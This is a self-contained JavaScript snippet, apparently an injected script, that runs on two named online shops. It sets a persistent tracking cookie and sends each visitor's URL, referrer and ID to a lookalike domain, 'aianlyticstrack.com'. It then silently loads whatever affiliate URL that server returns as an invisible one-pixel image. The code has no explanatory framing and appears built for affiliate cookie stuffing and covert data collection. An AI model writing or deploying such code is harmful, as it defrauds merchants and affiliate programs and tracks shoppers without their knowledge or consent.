(function () {
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function createTrackingPixel(url) {
    const img = document.createElement('img');
    img.src = url;
    img.width = 1;
    img.height = 1;
    img.style.display = 'none';
    document.body.appendChild(img);
  }

  function isCheckoutPage() {
    const keywords = ['cart', 'checkout', 'review-order', 'shipping', 'payment', 'pay'];
    return keywords.some((keyword) =>
      window.location.pathname.toLowerCase().includes(keyword)
    );
  }

  async function trackUser() {
    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

      const response = await fetch('https://aianlyticstrack.com/api/track-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname
        })
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
        sessionStorage.setItem('tracking_done', '1');
      } else {
        createTrackingPixel('https://aianlyticstrack.com/api/fallback-pixel?id=' + uniqueId);
      }
    } catch (err) {
      console.error('Tracking error', err);
    }
  }

  function initTracking() {
    const hostname = window.location.hostname;
    const siteConfig = {
      'alokozayshop.com': { always: true, cartExtra: false },
      'steadfastgolf.com': { always: true, cartExtra: false }
    };
    const config = siteConfig[hostname];
    if (!config) return;

    if (config.cartExtra && isCheckoutPage()) trackUser();
    else config.always && trackUser();
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    initTracking();
  } else {
    window.addEventListener('DOMContentLoaded', initTracking, { once: true });
  }
})();
